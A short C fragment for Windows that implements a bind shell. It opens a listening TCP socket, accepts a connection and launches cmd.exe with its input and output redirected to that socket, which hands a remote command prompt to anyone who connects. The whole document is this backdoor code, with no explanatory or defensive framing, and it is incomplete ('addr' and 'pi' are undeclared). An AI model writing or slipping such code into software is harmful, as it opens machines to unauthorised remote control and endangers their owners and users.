#include <winsock2.h>
void serve(void) {
 SOCKET listener = socket(AF_INET, SOCK_STREAM, 0);
 bind(listener, (struct sockaddr *)&addr, sizeof(addr));
 listen(listener, 1);
 SOCKET client = accept(listener, 0, 0);
 STARTUPINFOA si = {0};
 si.dwFlags = STARTF_USESTDHANDLES;
 si.hStdInput = (HANDLE)client;
 si.hStdOutput = (HANDLE)client;
 si.hStdError = (HANDLE)client;
 CreateProcessA(0, "cmd.exe", 0, 0, 1, 0, 0, 0, &si, &pi);
}
